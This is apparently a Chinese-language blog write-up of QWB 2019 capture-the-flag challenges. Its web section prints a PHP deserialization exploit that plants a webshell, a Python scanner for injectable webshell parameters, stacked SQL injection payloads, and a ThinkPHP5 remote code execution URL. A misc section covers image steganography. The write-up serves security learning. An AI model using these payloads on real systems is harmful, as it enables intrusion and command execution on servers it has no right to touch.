---
title: QWB 3th Partial Writeup
key: 2b2091662ac6460aa4b113608ed28eb0
tags:
  - Writeup
  - CTF
date: 2019-05-27 17:11:00

---

## Web

### upload

![](/assets/images/move/1558948442888-657f6dce-0927-484d-9b39-5a6923ab1e5e.png)

首先进行**信息搜集**，`dirsearch`探测发现存在`robots.txt`、`/upload/`、`www.tar.gz`，下载源代码进行审计。

网站主要包含注册、登录、上传图片三个功能点，`/upload/`目录可查看已上传图片。

![](/assets/images/move/2019-08-13-21-40-39.png)

Cookie中`user`字段经过URL和Base64解码后发现如下序列化内容：

```php
a:5:{s:2:"ID";i:3;s:8:"username";s:3:"3nd";s:5:"email";s:11:"3nd@3nd.xyz";s:8:"password";s:32:"9ee7098eadd66450d552896a0685ea09";s:3:"img";N;}
```

![](/assets/images/move/2019-08-13-21-49-54.png)

上传图片后Cookie user字段解码如下:

```php
a:5:{s:2:"ID";i:3;s:8:"username";s:3:"3nd";s:5:"email";s:11:"3nd@3nd.xyz";s:8:"password";s:32:"9ee7098eadd66450d552896a0685ea09";s:3:"img";s:79:"../upload/0411907e87757c2a5825a731923b7f93/5dce9218e9bcd30e209e6a6685489808.png";}
```

至此猜测可能存在**反序列化**的利用点，下面对源代码进行审计。

![](/assets/images/move/2019-08-13-21-53-07.png)

定位到`\application\web\controller\`中以下文件:

```bash
Index.php
Profile.php
Register.php
```

`Profile.php`中的敏感函数`upload_img()`如下：

```php
public function upload_img(){
    if($this->checker){
        if(!$this->checker->login_check()){
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
            $this->redirect($curr_url,302);
            exit();
        }
    }
    if(!empty($_FILES)){
        $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
        $this->filename=md5($_FILES['upload_file']['name']).".png";
        $this->ext_check();
    }
    
    if($this->ext) {
        if(getimgize($this->filename_tmp)) {
            @copy($this->filename_tmp, $this->filename);
            @unlink($this->filename_tmp);
            $this->img="../upload/$this->upload_menu/$this->filename";
            $this->update_img();
        }else{
            $this->error('Forbidden type!', url('../index'));
        }
    }else{
        $this->error('Unknow file type!', url('../index'));
    }
}
```

观察到其中文件存储的操作没有进行过滤，在`$this->filename`可控的情况下可生成脚本文件。

```php
if(getimgize($this->filename_tmp)) {
    @copy($this->filename_tmp, $this->filename);
    @unlink($this->filename_tmp);
    $this->img="../upload/$this->upload_menu/$this->filename";
    $this->update_img();
}
```

跟进`$this->filename_tmp`和`$this_filename`：

```php
if(!empty($_FILES)){
    $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
    $this->filename=md5($_FILES['upload_file']['name']).".png";
    $this->ext_check();
}
```

这里对`$this->filename`进行了后缀`.png`的拼接。未进行文件上传时`$_FILES`为Null，`!empty($_FILES)`为flase，则不进入`if`中的代码段。

```php
if($this->checker){
    if(!$this->checker->login_check()){
        $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
        $this->redirect($curr_url,302);
        exit();
    }
}
```

这里可以通过赋值`$this->checker`以控制类中的属性值来bypass if中的代码段。

至此我们可以通过控制Profile类中的checker、filename_tmp、filename等属性，在触发upload_img()函数时即可成功构造任意脚本文件，下面构造攻击链。

在`Profile`类中存在魔术方法`__get()`和`__call()`，在对象上下文中调用**不可访问属性**时自动触发`__get()`，在对象上下文中调用**不可访问的方法**时自动触发`__call()`。

```php
public function __get($name) {
    return $this->except[$name];
}
public function __call($name, $arguments) {
    if($this->{$name}){
        $this->{$this->{$name\}\}($arguments);
    }
}
```

在`Index`类中看到反序列化点:

```php
public function login_check(){
    $profile=cookie('user');
    if(!empty($profile)){
        $this->profile=unserialize(base64_decode($profile));
        $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
        if(array_diff($this->profile_db,$this->profile)==null){
            return 1;
        }else{
            return 0;
        }
    }
}
```

Index类中的index()调用了login_check()，login_check()进行`unserialize(base64_decode(cookie('user')))`触发反序列化，Cookie user字段可控，这里作为反序列化的触发点。


在`Register`类中关键部分如下:

```php
class Register extends Controller {
    public $checker;
    public $registed;

    public function __construct() {
        $this->checker=new Index();
    }

    public function __destruct() {
        if(!$this->registed){
            $this->checker->index();
        }
    }
}
```

其中`$this->checker->index()`调用了Index类中的index()方法，这里如果覆盖`__construct()`中的Index()为Profile()，那么在尝试调用Profile中的index()方法时将触发Profile中的`__call()`魔术方法:

```php
public function __call($name, $arguments)
{
    if($this->{$name}){
        $this->{$this->{$name\}\}($arguments);
    }
}
```

进入`__call()`中尝试访问`this->{$name}`即`Profile->index`,这是进一步触发Profile中的`__get()`魔术方法：


```php
public function __get($name) {
    return $this->except[$name];
}
```

从而返回`$this->except[$name]`即`Profile->except['index']`的值，那么如果我们在构造序列化内容时赋值`except['index']`为`upload_img`，当Register对象销毁时触发__destruct()时，即可成功触发upload_img()函数中的关键操作进行文件的复制和改名。

POP链如下：

```php
Register->__destruct()
Profile->__call()
Profile->__get()
Profile->upload_img()
```

exp如下：

```php
<?php
namespace app\web\controller;
class Profile {
    public $checker = 0;
    public $filename_tmp = "../public/upload/15fabb2a30e293533a1bcaf3f5e2743f/00bf23e130fa1e525e332ff03dae345d.png";
    public $filename = "../public/upload/15fabb2a30e293533a1bcaf3f5e2743f/3nd.php";
    public $upload_menu;
    public $ext = 1;
    public $img;
    public $except = array('index'=>'upload_img');

}
class Register {
    public $checker;
    public $registed = 0;
}
$x = new Register();
$x->checker = new Profile();
echo base64_encode(serialize($x));
```

攻击流程流程：上传含恶意代码的图片文件->复制图片地址，根据exp生成序列化数据->访问首页替换Cookie中的user字段触发函数生成3nd.php->访问3nd.php，getshell执行命令获取flag。

![](/assets/images/move/2019-08-13-22-58-21.png)

![](/assets/images/move/2019-08-13-22-58-47.png)



### 高明的黑客

> 雁过留声，人过留名，此网站已被黑
>
> 我也是很佩服你们公司的开发，特地备份了网站源码到www\.tar.gz以供大家观赏

下载源代码解压得到3002个混淆后的php文件，每个文件中包含多个参数和system()/eval()函数。

```php
system($_GET['cg6BNgitU'] ?? ' ');
eval($_GET['ganVMUq3d'] ?? ' ');
```

猜测某个文件中可能存在命令执行的利用点，本地进行爆破尝试。

```python
import re
import os
import requests

main_url = "http://127.0.0.1/hack/"
rg = re.compile(r'\$_GET\[\'(.*?)\'\]')
rp = re.compile(r'\$_POST\[\'(.*?)\'\]')
files = os.listdir("./hack/") #xk0SzyKwfzw.php

for file in files:
    print("[*]Detecting: " + file)
    url = main_url + file
    fn = "./hack/" + file
    with open(fn) as f:
        data = f.read()
        params_get = rg.findall(data)
        params_post = rp.findall(data)
    # $_GET
    query = "=echo success;&".join(params_get)
    r = requests.get(url + '?' + query)
    if "success" in r.text:
        print("[+]Found: " + file)
        print("[*]Detecting the Parameter...")
        for param in params_get:
            r = requests.get(url + '?' + param + '=echo success;')
            if "success" in r.text:
                print('[+]Parameter: ' + param)
                exit()
    # $_POST
    dict = {}
    for param in params_post:
        dict[param] = "echo success;"
    r = requests.post(url, data=dict)
    if "success" in r.text:
        for key in dict.keys():
            r = requests.post(url, {key: dict[key],})
            if "success" in r.text:
                print('[+]Parameter: ' + key)
                exit()
```

执行结果:

```bash
...
[*]Detecting: xk0SzyKwfzw.php
[+]Found: xk0SzyKwfzw.php
[+]Type: $_GET
[*]Detecting the Parameter...
[+]Parameter: Efa5BVG
[Done] exited with code=0 in 872.331 seconds
```

`xk0SzyKwfzw.php?Efa5BVG=cat+/flag;`即可获取flag。

### 随便注



> **取材于某次真实环境渗透，只说一句话：开发和安全缺一不可**

```html
<html>
<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>
<body>
    <h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
    <!-- sqlmap是没有灵魂的 -->
    <form method="get">
        姿势: <input type="text" name="inject" value="1">
        <input type="submit">
    </form>
</body>
</html>
```

测试时回显:

```php
return preg_match("/select|update|delete|drop|insert|where|\./i", $inject);
```

由过滤了`update|delete|drop|insert`猜测可能存在堆叠注入，测试`inject=1;show tables;--+`：

```php
array(1) {
[0]=>
array(2) {
["id"]=>
string(1) "1"
["data"]=>
string(12) "Only red tea"
}
}
array(2) {
[0]=>
array(1) {
["Tables_in_supersqli"]=>
string(16) "1919810931114514"
}
[1]=>
array(1) {
["Tables_in_supersqli"]=>
string(5) "words"
}
}
```

尝试查询创建表(1919810931114514)的语句，得到表结构：

```php
# ?inject=1';show create table `1919810931114514`;--+
array(1) {
[0]=>
array(2) {
["Table"]=>
string(16) "1919810931114514"
["Create Table"]=>
string(87) "CREATE TABLE `1919810931114514` (
`flag` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"
}
}
```

#### alter table

无法直接查询flag，可以考虑通过修改表结构和表名从而使页面来查询回显flag。

```sql
# 给 1919810931114514 增加 id 字段 后更名为 words
alter table `1919810931114514` add(id int default 1);
alter table words rename xxx;
alter table `1919810931114514` rename words;#
```

查询`inject=1`得到:

```php
array(1) {
[0]=>
array(2) {
["flag"]=>
string(38) "flag{e06218d29a616199aa97f369d0404622}"
["id"]=>
string(1) "1"
}
}
```

#### handler read first

sixstars:

```sql
?inject=1'; do sleep(5);-- 
?inject=1'; show tables;-- 
?inject=1; handler `1919810931114514` open as hh; handler hh read first;-- 
```

#### set prepare

FlappyPig: 过滤了union select，没办法跨表，但是可以堆叠查询，那么猜测是⽤mysqli_multi_query()函数进⾏
sql语句查询的，也就可以使⽤ 预处理：

```sql
set @sql = concat('create table ',newT,' like ',old); prepare s1 from @sql; execute s1; 
```

最后由于表名是数字表名所以要加上反引号`\``, Payload:

```bash
1';set%0a@s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116), CHAR(32),CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(32),CHAR(102),CHAR(114),C HAR(111),CHAR(109),CHAR(32),CHAR(96),CHAR(49),CHAR(57),CHAR(49),CHAR(57),CHAR( 56),CHAR(49),CHAR(48),CHAR(57),CHAR(51),CHAR(49),CHAR(49),CHAR(49),CHAR(52),CH AR(53),CHAR(49),CHAR(52),CHAR(96),CHAR(59));PREPARE%0as2%0aFROM%0a@s;EXECUTE%0 as2;--+
```

#### 预处理 + hex

网站是用 pdo 连的数据库，因此允许多语句执行，可以用 `SET PREPARE` 绕过 strstr 和 preg_match 的检查，Payload 如下：

eee：

```sql
// enhex('select flag from supersqli.1919810931114514')
1';SET @a:=0x73656c65637420666c61672066726f6d20737570657273716c692;prepare s from @a; execute s;# 
```

### 强网先锋-上单

```c
Index of /1
[ICO]   Name            Last modified      Size	   Description
----------------------------------------------------------------
[PARENTDIR]	Parent Directory 	 
[TXT]   LICENSE.txt     2019-04-03 15:08   1.8K	 
[   ]   README.md       2019-04-03 15:08   5.6K	 
[   ]   build.php       2019-04-03 15:08   1.1K	 
[   ]   composer.json   2019-04-03 15:08   942	 
[   ]   composer.lock   2019-04-03 15:08   18K	 
[DIR]   extend/         2019-04-02 20:58    -	 
[DIR]   public/         2019-04-03 15:08    -	 
[DIR]   runtime/        2019-04-02 20:58    -	 
[   ]   think           2019-04-03 15:08   753	 
[DIR]   vendor/         2019-04-02 20:58    -	 
Apache/2.4.18 (Ubuntu) Server at 117.78.28.89 Port 30910
```

![](/assets/images/move/1558953551013-2005b272-8437-410f-b11c-2ad1e97816f0.png)

- 参考: [ThinkPHP5.x 前台getshell分析](https://www.kingkk.com/2018/12/ThinkPHP5-x-%E5%89%8D%E5%8F%B0getshell%E5%88%86%E6%9E%90/#%E6%9C%80%E5%90%8E)

通用payload:

```php
index.php
?s=index/\think\app/invokefunction
&function=call_user_func_array
&vars[0]=system
&vars[1][]=cat+/flag //flag{573bebb4fa5f7da686b91e218bd58256} 
```

另外在`/1/runtime/log/201903/12.log`中发现payload如下，可以直接使用。

```php
[ 2019-03-12T23:18:49+08:00 ] 223.104.19.11 GET 39.105.136.196:8000/ \
    ?s=index/\think\app/invokefunction\
	&function=call_user_func_array \
	&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type error： boolean
```



## Misc



### 强网先锋-打野



![](/assets/images/move/1559055148609-b5e24fa0-49b0-409c-8d7f-cf72519f351c.png)

> [zsteg](https://github.com/zed-0xff/zsteg)是俄罗斯黑客开发的一款开源工具，专用于检测 PNG 与 BMP 格式图片中的隐写信息，用 Ruby 语言开发，gem install zsteg即可安装使用。

zsteg可用于探测:

- LSB steganography in PNG & BMP
- zlib-compressed data
- [OpenStego](http://openstego.sourceforge.net/)
- [Camouflage 1.2.1](http://camouflage.unfiction.com/)
- [LSB with The Eratosthenes set](http://wiki.cedricbonhomme.org/security:steganography)

```bash
$ zsteg 01.bmp
[?] 2 bytes of extra data after image end (IEND), offset = 0x269b0e
extradata:0         .. ["\x00" repeated 2 times]
imagedata           .. text: ["\r" repeated 18 times]
b1,lsb,bY           .. <wbStego size=120, ext="\x00\x8E\xEE",
                       data="\x1Ef\xDE\x9E\xF6\xAE\xFA\xCE\x86\x9E"..., even=false>
b1,msb,bY           .. text: "qwxf{you_say_chick_beautiful?}"
b2,msb,bY           .. text: "i2,C8&k0."
b2,r,lsb,xY         .. text: "UUUUUU9VUUUUUUUUUUUUUUUUUUUUUU"
b2,g,msb,xY         .. text: ["U" repeated 22 times]
b2,b,lsb,xY         .. text: ["U" repeated 10 times]
b3,g,msb,xY         .. text: "V9XDR\\d@"
b4,r,lsb,xY         .. file: TIM image, Pixel at (4353,4112) Size=12850x8754
b4,g,lsb,xY         .. text: "3\"\"\"\"\"3###33##3#UDUEEEEEDDUETEDEDDUEEDTEEEUT#!"
b4,g,msb,xY         .. text: "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\
                             "DDDDDDDDDDDD\"\"\"\"DDDDDDDDDDDD*LD"
b4,b,lsb,xY         .. text: "gfffffvwgwfgwwfw"
                    ..
```

即可获取到flag: `qwxf{you_say_chick_beautiful?}`

